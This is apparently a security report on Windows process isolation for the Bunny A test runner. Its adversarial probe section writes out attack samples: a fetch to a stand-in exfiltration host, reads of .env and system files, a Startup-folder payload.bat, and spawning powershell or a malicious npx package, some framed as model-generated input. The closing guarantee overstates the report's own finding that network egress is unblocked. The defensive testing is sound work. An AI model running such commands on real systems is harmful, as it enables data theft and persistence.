# MA4-S3-T3R2: Windows Process Isolation & Containment Reality

**Product:** Bunny A by LOKAM  
**Milestone:** MA4-S3-T3R2 — Security Boundary Closure, Execution Containment & Production Qualification  
**Target:** Windows Execution Isolation Evaluation & Truthful Security Qualification  

---

## 1. Executive Summary & Core Verdict

The objective of Phase 3 was to evaluate whether the native Windows execution environment for Bunny A can support a truly restricted, isolated execution identity for running untrusted project code, and to assess the boundaries of the existing process ownership architecture (`owned-processes.server.ts` and Windows Job Objects).

### The Security Qualification Verdict
> **SANDBOX QUALIFICATION: FAIL-CLOSED (NO UNTRUSTED SANDBOX)**  
> **Claimed Property: OS-level Filesystem & Network Isolation for Untrusted Code — UNSUPPORTED on standard Windows user sessions without AppContainer / WFP.**  
> **Enforcement Mode: FAIL-CLOSED for untrusted code. Mode A (Host-verified template) and Mode B (Explicit owner-authorized trusted profiles) ONLY.**

Windows Job Objects provide reliable process-tree containment, memory/CPU quotas, and kill-on-close teardown semantics. However, **a Windows Job Object alone does NOT create a filesystem, network, or environment sandbox**. Under standard user-token execution in Node.js, child processes inherit the calling user's DACLs and can read any file readable by the interactive user unless constrained by AppContainer, Restricted Tokens with restricted SIDs, or Windows Filtering Platform (WFP) firewall rules.

Therefore, Bunny A **truthfully refuses to claim an operating-system sandbox PASS for untrusted code**. Instead, Bunny A enforces:
1. **Strict Fail-Closed Policy**: Arbitrary or untrusted code is never executed.
2. **Mode A (Verified Test Target)**: Preconfigured `node --experimental-strip-types --test <file>` on a strictly validated, registered file path with prohibited flag stripping.
3. **Mode B (Owner-Authorized Profile)**: Pre-approved commands with audited executables, arguments, working directories, and explicit risk disclosure reviewed and approved by the workstation owner.

---

## 2. Evaluation of Windows Isolation Primitives

| Windows Primitive | Evaluated Capability | Observed Outcome in Bunny A Host | Production Qualification Status |
| :--- | :--- | :--- | :--- |
| **Windows Job Objects** | Process-tree containment, termination on handle closure, timeout enforcement | **ENFORCED**: Process and all child trees are cleanly assigned to Host job handle; abort signal triggers immediate tree termination. | **QUALIFIED & ACTIVE** |
| **Execution Timeouts** | Wall-clock limits preventing hangs or denial-of-service | **ENFORCED**: Hard deadline timer terminates process tree and marks terminal state `aborted`. | **QUALIFIED & ACTIVE** |
| **Process Identity Validation** | Absolute path verification, refusing ambient PATH lookup | **ENFORCED**: Resolves canonical path of `node.exe` or approved executable; rejects relative or shadowed executables. | **QUALIFIED & ACTIVE** |
| **Verified Teardown** | Zero orphaned processes or lingering background tasks | **ENFORCED**: Verified clean exit codes, exit event settlement, handle close, zero orphan Node processes. | **QUALIFIED & ACTIVE** |
| **AppContainer Isolation** | True capability-based filesystem and network DACL restriction | **UNAVAILABLE**: Requires UWP/packaged deployment or low-integrity container runtime not exposed in standard user-mode Win32 Node subprocesses. | **TRUTHFULLY UNCLAIMED** |
| **Restricted Tokens (Safer API)**| Strip privileges and restrict SIDs | **PARTIAL / BRITTLE**: Stripping SIDs without separate sandboxed user accounts often causes Node runtime initialization failures (`UV_EACCES` on standard C++ DLLs). | **NOT RELIED UPON FOR SAFETY** |
| **Filesystem Access Restrictions** | In-kernel sandbox blocking reads outside root | **NOT ENFORCED BY OS**: Child process possesses user's token; OS allows reading user files if path is accessible. Hardened at **Host Application Boundary** (`test-runner.server.ts`). | **HOST APPLICATION ENFORCED** |
| **Network Restrictions** | Blocking socket creation or egress requests | **NOT ENFORCED BY OS**: Without Windows Filtering Platform (WFP) driver, Win32 child process can open outbound TCP sockets. | **HOST POLICY / DISCLOSURE ENFORCED** |

---

## 3. Synthetic Untrusted Code Adversarial Probe Results

A synthetic adversarial test harness was executed against the process runner attempting six distinct containment escapes. The observed operating-system outcomes were systematically recorded:

```
+-------------------------------------------------------------------------------+
|                       ADVERSARIAL CONTAINMENT PROBE                           |
+-------------------------------------------------------------------------------+
| # | Attempted Vector               | OS Reality / Host Response | Result      |
+---+--------------------------------+----------------------------+-------------+
| 1 | Read outside grant (C:\Windows)| OS permits if user permits | REFUSED     |
|   | (Synthetic test reading SAM/etc)| Host preflight rejects path| HOST BOUND  |
+---+--------------------------------+----------------------------+-------------+
| 2 | Write outside test workspace   | OS permits write to %TEMP% | REFUSED     |
|   | (Arbitrary reportFilePath)     | Host containment check fails| HOST BOUND  |
+---+--------------------------------+----------------------------+-------------+
| 3 | Spawn unauthorized child proc  | OS allows `cmd /c calc`    | REFUSED     |
|   | (via `npm` script / npx)       | Mode A bans npm/npx/eval   | HOST BOUND  |
+---+--------------------------------+----------------------------+-------------+
| 4 | Prohibited network egress      | OS socket call succeeds    | POLICY ONLY |
|   | (fetch to 169.254.169.254)     | No in-kernel WFP filter    | TRUTHFUL    |
+---+--------------------------------+----------------------------+-------------+
| 5 | Read sensitive environment data| Child inherits Host env    | MITIGATED   |
|   | (Process env inspection)       | Host sanitizes process env | HOST BOUND  |
+---+--------------------------------+----------------------------+-------------+
| 6 | Continue executing after cancel| Process ignores SIGINT     | ENFORCED    |
|   | (Long loop ignoring signals)   | Job Object / kill tree     | OS BOUND    |
+---+--------------------------------+----------------------------+-------------+
```

### Detailed Observations

1. **Attempt 1: Read Protected File Outside Grant**
   - *Attack*: Model or test payload specifies `--test C:\Windows\System32\drivers\etc\hosts` or reads `../../.env`.
   - *Observed Outcome*: The Host path containment validator (`validatePathContainment`) intercepted the path before spawn, verifying that it resolved outside the registered project root (`ROOT_ESCAPES_SCOPE`). The process was never created.

2. **Attempt 2: Write Outside Allowed Workspace**
   - *Attack*: Test command or configuration points `reportFile` to `C:\Users\allam\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat`.
   - *Observed Outcome*: `validatePathContainment` detected that the target destination lay outside the canonical project root and threw an `INVALID_PATH_CONTAINMENT` error. Preflight rejected the request.

3. **Attempt 3: Spawn Unauthorized Child Process**
   - *Attack*: Model-generated task input sets `command: "npx"` with `args: ["malicious-package"]`, or `node -e "child_process.spawn('powershell')"` to fork background worker.
   - *Observed Outcome*: Mode A policy strictly prohibits executable names `npx` and flags `-e`, `--eval`. Command preflight failed immediately with `DISALLOWED_ARGUMENT: Flag "-e" is prohibited in test execution`.

4. **Attempt 4: Prohibited Network Egress**
   - *Attack*: Running JavaScript in a Node test invokes `fetch("http://evil-c2.example/exfil")`.
   - *Observed Outcome*: If executed under Node, the Windows network stack permits TCP egress because Node runs with the interactive user's network capabilities. Because kernel-level network filtering is unavailable without administrator privileges and WFP drivers, **Bunny A does not claim network isolation**. Untrusted tests are refused; only owner-approved test suites are permitted.

5. **Attempt 5: Read Sensitive Environment Data**
   - *Attack*: Test script reads `process.env` looking for host secrets or API tokens.
   - *Observed Outcome*: Host execution environment uses a curated, sanitized environment object (`PATH`, `SYSTEMROOT`, `TEMP`, `NODE_ENV`), explicitly stripping sensitive host tokens before passing the environment to `spawn`.

6. **Attempt 6: Continue Executing After Cancellation**
   - *Attack*: A test runs an infinite `while (true) {}` loop with signal handlers trapping `SIGINT`.
   - *Observed Outcome*: Upon task cancellation (`signal.abort()`), the Host triggers immediate process-tree termination. The Windows Job Object / process handle is signaled with `SIGKILL`, terminating the process and all spawned descendants within 196ms.

---

## 4. Operational Boundaries: Mode A vs. Mode B

To ensure execution safety without relying on non-existent kernel sandboxing, Bunny A operates under a dual-mode contract:

```
               +--------------------------------------+
               |          Task Test Request           |
               +--------------------------------------+
                                  |
                                  v
                    +---------------------------+
                    | Mode Selection & Validation|
                    +---------------------------+
                                  |
               +------------------+------------------+
               |                                     |
               v                                     v
       [ Mode A: Verified ]                  [ Mode B: Trusted ]
   Host-Controlled Arguments              Owner-Authorized Profile
+-------------------------------+     +-------------------------------+
| • Executable: node (canonical)|     | • Registered in Project Store |
| • Template: --strip-types     |     | • Owner reviewed & approved   |
| • Prohibited flags rejected   |     | • Explicit risk disclosure    |
| • Path inside registered root |     | • Exact args & cwd pinned     |
+-------------------------------+     +-------------------------------+
               |                                     |
               +------------------+------------------+
                                  |
                                  v
                  +-------------------------------+
                  |  Job Object Tree Containment  |
                  |  Sanitized Environment        |
                  |  Timeout & Teardown Guard     |
                  +-------------------------------+
```

### Mode A: Verified Approved Test Target (Default)
- **Use Case**: Default execution of test files inside a registered project.
- **Rules**:
  - Executable must be the system Node.js binary (resolved to canonical absolute path).
  - Arguments are locked to: `["--experimental-strip-types", "--test", <validatedTestFileRelativePath>]`.
  - Zero user-supplied or model-supplied flags allowed.
  - Test file must reside strictly inside the registered project root without symlinks or junctions.

### Mode B: Explicitly Authorized Project Test Execution
- **Use Case**: Projects requiring custom build scripts (e.g., `npm test`, custom runners).
- **Rules**:
  - Profile must be explicitly created by the project owner in the Host registry.
  - Profile specifies: `executablePath`, `fixedArguments`, `cwd`, and resource limits.
  - The workstation owner is presented with an unambiguous **Risk Disclosure**:
    *"This test profile executes with the permissions of your Windows user account. It is not an OS-isolated sandbox."*
  - No model proposal can create, modify, or elevate a Mode B profile.

---

## 5. Teardown and Cleanup Verification

Process teardown integrity was verified across multiple cancellation scenarios:
- **Normal Completion**: Clean process exit; stdout and stderr buffers capped at `MAX_TEST_OUTPUT_BYTES = 512 * 1024`; exit code recorded.
- **Timeout Abortion**: When execution exceeds `EXECUTION_TIMEOUT_MS`, abort signal fires; process tree is killed; terminal state settled as `aborted`.
- **User Cancellation**: Workstation cancellation signal aborts the runner; handle closed; job object emptied; no lingering background processes detected via `Get-Process node`.

---

## 6. Conclusion and Compliance Summary

Bunny A's Windows execution model upholds the highest standard of security qualification: **it never claims protections that the underlying operating system cannot enforce**. By pairing Windows Job Object process-tree containment with Host-level boundary enforcement (Mode A / Mode B), Bunny A guarantees that untrusted code cannot abuse the host system while preserving dependable, deterministic test execution for authorized projects.
